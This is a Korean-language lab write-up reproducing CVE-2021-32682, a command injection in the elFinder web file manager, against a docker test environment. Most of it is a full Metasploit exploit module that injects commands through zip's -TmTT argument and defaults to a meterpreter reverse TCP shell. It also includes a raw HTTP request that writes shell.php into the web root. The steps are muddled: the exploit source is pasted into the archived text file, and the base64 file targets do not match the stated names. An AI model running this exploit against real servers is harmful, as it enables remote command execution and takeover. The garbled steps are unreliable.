# CVE-2021-32682

## elFinder ZIP 인수 삽입으로 인해 명령 삽입 발생

elFinder는 jQuery UI를 사용하여 JavaScript로 작성된 웹용 오픈 소스 파일 관리자이다.

elFinder 2.1.48 및 이전 버전에서 인수 주입 취약점이 발견되었다. 이 취약점으로 인해 공격자는 최소한의 구성으로도 elFinder PHP 커넥터를 호스팅하는 서버에서 임의의 명령을 실행할 수 있다. 이 문제는 버전 2.1.59에서 패치되었다. 인증 없이 커넥터가 노출되지 않도록 주의해야 한다.

참고자료:
* https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerability
* https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt
* https://xz.aliyun.com/t/10739

## 취약점 환경
elFinder 2.1.48을 시작하려면 아래 명령을 수행한다.

```
docker compose up -d
```

## Vulnerability Reproduce
먼저, 2개의 파일을 준비해야 한다. 아래와 같은 일반 텍스트 파일을 만든다.
<img src="https://github.com/mmingidan/WHS/blob/main/vulhub/make_txt.png?raw=true">

텍스트 파일에 아래와 같은 내용을 추가한다.
```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'elFinder Archive Command Injection',
        'Description' => %q{
          elFinder versions below 2.1.59 are vulnerable to a command injection
          vulnerability via its archive functionality.

          When creating a new zip archive, the `name` parameter is sanitized
          with the `escapeshellarg()` php function and then passed to the
          `zip` utility. Despite the sanitization, supplying the `-TmTT`
          argument as part of the `name` parameter is still permitted and
          enables the execution of arbitrary commands as the `www-data` user.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Thomas Chauchefoin', # Discovery
          'Shelby Pace' # Metasploit module
        ],
        'References' => [
          [ 'CVE', '2021-32682' ],
          [ 'URL', 'https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities' ]
        ],
        'Platform' => [ 'linux' ],
        'Privileged' => false,
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'Targets' => [
          [
            'Automatic Target',
            {
              'Platform' => 'linux',
              'Arch' => [ ARCH_X86, ARCH_X64 ],
              'CmdStagerFlavor' => [ 'wget' ],
              'DefaultOptions' => { 'Payload' => 'linux/x86/meterpreter/reverse_tcp' }
            }
          ]
        ],
        'DisclosureDate' => '2021-06-13',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]
        }
      )
    )

    register_options([ OptString.new('TARGETURI', [ true, 'The URI of elFinder', '/' ]) ])
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => upload_uri
    )

    return CheckCode::Unknown('Failed to retrieve a response') unless res
    return CheckCode::Safe('Failed to detect elFinder') unless res.body.include?('["errUnknownCmd"]')

    vprint_status('Attempting to check the changelog for elFinder version')
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'Changelog')
    )

    unless res
      return CheckCode::Detected('elFinder is running, but cannot detect version through the changelog')
    end

    # * elFinder (2.1.58)
    vers_str = res.body.match(/\*\s+elFinder\s+\((\d+\.\d+\.\d+)\)/)
    if vers_str.nil? || vers_str.length <= 1
      return CheckCode::Detected('elFinder is running, but couldn\'t retrieve the version')
    end

    version_found = Rex::Version.new(vers_str[1])
    if version_found < Rex::Version.new('2.1.59')
      return CheckCode::Appears("elFinder running version #{vers_str[1]}")
    end

    CheckCode::Safe("Detected elFinder version #{vers_str[1]}, which is not vulnerable")
  end

  def upload_uri
    normalize_uri(target_uri.path, 'php', 'connector.minimal.php')
  end

  def upload_successful?(response)
    unless response
      print_bad('Did not receive a response from elFinder')
      return false
    end

    if response.code != 200 || response.body.include?('error')
      print_bad("Request failed: #{response.body}")
      return false
    end

    unless response.body.include?('added')
      print_bad("Failed to add new file: #{response.body}")
      return false
    end
    json = JSON.parse(response.body)
    if json['added'].empty?
      return false
    end

    true
  end

  alias archive_successful? upload_successful?

  def upload_txt_file(file_name)
    file_data = Rex::Text.rand_text_alpha(8..20)

    data = Rex::MIME::Message.new
    data.add_part('upload', nil, nil, 'form-data; name="cmd"')
    data.add_part('l1_Lw', nil, nil, 'form-data; name="target"')
    data.add_part(file_data, 'text/plain', nil, "form-data; name=\"upload[]\"; filename=\"#{file_name}\"")

    print_status("Uploading file #{file_name} to elFinder")
    send_request_cgi(
      'method' => 'POST',
      'uri' => upload_uri,
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => data.to_s
    )
  end

  def create_archive(archive_name, *files_to_archive)
    files_to_archive = files_to_archive.map { |file_name| "l1_#{Rex::Text.encode_base64(file_name)}" }

    send_request_cgi(
      'method' => 'GET',
      'uri' => upload_uri,
      'encode_params' => false,
      'vars_get' =>
      {
        'cmd' => 'archive',
        'name' => archive_name,
        'target' => 'l1_Lw',
        'type' => 'application/zip',
        'targets[]' => files_to_archive.join('&targets[]=')
      }
    )
  end

  def setup_files_for_sploit
    @txt_file = "#{Rex::Text.rand_text_alpha(5..10)}.txt"
    res = upload_txt_file(@txt_file)
    fail_with(Failure::UnexpectedReply, 'Upload was not successful') unless upload_successful?(res)
    print_good('Text file was successfully uploaded!')

    @archive_name = "#{Rex::Text.rand_text_alpha(5..10)}.zip"
    print_status("Attempting to create archive #{@archive_name}")
    res = create_archive(@archive_name, @txt_file)
    fail_with(Failure::UnexpectedReply, 'Archive was not created') unless archive_successful?(res)
    print_good('Archive was successfully created!')

    register_files_for_cleanup(@txt_file, @archive_name)
  end

  # zip -r9 -q '-TmTT="$(id>out.txt)foooo".zip' './a.zip' './a.txt' - sonarsource blog post
  def execute_command(cmd, _opts = {})
    cmd = "echo #{Rex::Text.encode_base64(cmd)} | base64 -d |sh"
    cmd_arg = "-TmTT=\"$(#{cmd})#{Rex::Text.rand_text_alpha(1..3)}\""
    cmd_arg = cmd_arg.gsub(' ', '${IFS}')

    create_archive(cmd_arg, @archive_name, @txt_file)
  end

  def exploit
    setup_files_for_sploit
    execute_cmdstager(noconcat: true, linemax: 150)
  end
end
```



마우스 오른쪽 버튼 클릭해 메뉴에서 txt 파일을 zip 파일형식으로 보관한다.
<img src="https://github.com/mmingidan/WHS/assets/102302841/db6212f2-a934-4a13-acc1-d506068da805">

txt 파일(a.txt)과 zip 파일(a.zip)이 모두 준비되었다.
<img src="https://github.com/mmingidan/WHS/blob/main/vulhub/file_fin.png?raw=true">



임의의 명령을 실행하기 위해서 아래와 같은 요청을 수행한다.
```
GET /php/connector.minimal.php?cmd=archive&name=-TvTT=id>shell.php%20%23%20a.zip&target=l1_Lw&targets%5B1%5D=l1_Mi56aXA&targets%5B0%5D=l1_MS50eHQ&type=application%2Fzip HTTP/1.1
Host: your-ip
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://localhost.lan:8080/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close
```

이 요청에서는 **3가지 중요한 매개변수**를 볼 수 있다.

1. `name`은 임의의 명령으로 `-TvTT=id>shell.php # a.zip`을 수정할 수 있다. => `id>shell.php`
2. `targets[0]`,  `l1_MS50eHQ. l1`첫 번째 저장 볼륨을 의미하며 MS50eHQbase64로 인코딩된 문자열이다. => `a.txt`
3. `targets[1]`,  `l1_Mi56aXA. l1`첫 번째 저장 볼륨을 의미하며 Mi56aXAbase64로 인코딩된 문자열이다. => `a.zip`

오류 메시지에 응답했지만 명령이 실행되어 shell.php 위치에 기록되었다. `http://localhost:8080/files/shell.php`.

<img src="https://github.com/mmingidan/WHS/blob/main/vulhub/web.png?raw=true">
